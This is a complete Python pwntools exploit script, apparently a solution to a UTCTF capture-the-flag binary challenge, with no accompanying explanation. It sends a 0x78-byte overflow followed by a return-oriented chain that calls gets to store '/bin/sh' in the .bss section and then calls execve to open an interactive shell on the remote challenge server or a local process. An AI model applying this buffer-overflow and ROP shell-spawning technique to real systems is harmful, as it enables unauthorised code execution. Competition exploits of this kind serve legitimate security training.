#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./AAAAAAAAAAAAAAAA',checksec=False)

if args.REMOTE:
	p = remote('pwn.utctf.live', 5000)
else:
	p = process(binary.path)

pop_rdi = binary.search(asm('pop rdi; ret')).__next__()
pop_rsi_r15 = binary.search(asm('pop rsi; pop r15; ret')).__next__()

payload  = b''
payload += 0x78 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.bss())
payload += p64(binary.plt.gets)
payload += p64(pop_rdi)
payload += p64(binary.bss())
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(binary.plt.execve)
payload += b'\n'
payload += b'/bin/sh\0'

p.sendline(payload)
p.interactive()

